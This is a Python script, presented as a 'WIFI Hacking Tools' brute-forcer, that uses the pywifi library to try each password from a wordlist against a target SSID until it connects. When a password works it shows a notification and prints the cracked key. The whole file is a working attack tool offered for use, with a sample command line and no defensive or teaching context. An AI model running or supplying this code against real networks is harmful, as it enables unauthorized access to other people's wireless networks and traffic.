try:
    import argparse
    import os
    import os.path
    import platform
    import time
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from socket import gethostname
    from pywifi import Profile
    from plyer import notification
    import time

    # Command:
    #    python "WIFI Bruteforce.py" -s "WIFI" -w "passwords.txt"

    os.system("cls")
    print("Loading Program...")
    client_ssid = "HUAWEI"
    path_to_file = " "
    HOSTNAME = gethostname()


    time.sleep(2)
    RED   = "\033[1;31m"
    BLUE  = "\033[1;34m"
    CYAN  = "\033[1;36m"
    GREEN = "\033[0;32m"
    RESET = "\033[0;0m"
    BOLD    = "\033[;1m"
    REVERSE = "\033[;7m"

    time.sleep(5)
    os.system("cls")
    print(CYAN, """
   .               .
 .´  ·  .     .  ·  `.  WIFI Hacking Tools
 :  :  :  (¯)  :  :  :  Brute Force WIFI For Windows And Linux
 `.  ·  ` /¯\ ´  ·  .´  Maintained by Karim
   `     /¯¯¯\     ´
    """)

    notification.notify(
        title = 'WIFI Tools',
        message = f'Welcome {HOSTNAME} to WIFI Bruteforce',
        app_icon = 'logo.ico',
        timeout = 5,
    )

    try:
        wifi = PyWiFi()
        ifaces = wifi.interfaces()[0]  
    
        ifaces.scan() 
        results = ifaces.scan_results()


        wifi = pywifi.PyWiFi() 
        iface = wifi.interfaces()[0]
    except:
        print("[ERROR] System Error")

    type = False

    def main(ssid, password, number):
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN 
        profile.akm.append(const.AKM_TYPE_WPA2PSK) 
        profile.cipher = const.CIPHER_TYPE_CCMP 


        profile.key = password 
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)  
        time.sleep(0.1)
        iface.connect(tmp_profile)
        time.sleep(0.35)

        if ifaces.status() == const.IFACE_CONNECTED: 
            time.sleep(1)
            notification.notify(
                title = 'WIFI Tools',
                message = 'WIFI password cracked!',
                app_icon = 'logo.ico',
                timeout = 60,
            )
            print(BOLD, GREEN,'[*] Crack success!',RESET)
            print(BOLD, GREEN,'[*] password is ' + password, RESET)
            time.sleep(1)
            exit()
        else:
            print(RED, '[{}] Password Failed using {}'.format(number, password))

    def pwd(ssid, file):
        number = 0
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                number += 1
                line = line.split("\n")
                pwd = line[0]
                main(ssid, pwd, number)
                        
    def menu(client_ssid,path_to_file):
        parser = argparse.ArgumentParser(description='WIFI Tools')

        parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
        parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

        print()
        args = parser.parse_args()

        print("[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
        time.sleep(1.5)

        if args.wordlist and args.ssid:
            ssid = args.ssid
            filee = args.wordlist
        else:
            print(BLUE)
            ssid = client_ssid
            filee = path_to_file 

        if os.path.exists(filee):
            if platform.system().startswith("Win" or "win"):
                os.system("cls")
            else:
                os.system("clear")

            print(BLUE,"[~] Cracking...")
            pwd(ssid, filee)
        else:
            print(RED,"[ERROR] Please specify a correct directory to the password file",BLUE)
            input()
            exit()


    menu(client_ssid , path_to_file)

except Exception as error:
    print(RED, f"[ERROR] An unexpected error occured, {error}")
except:
    print(RED, "[ERROR] An unexpected error occured")
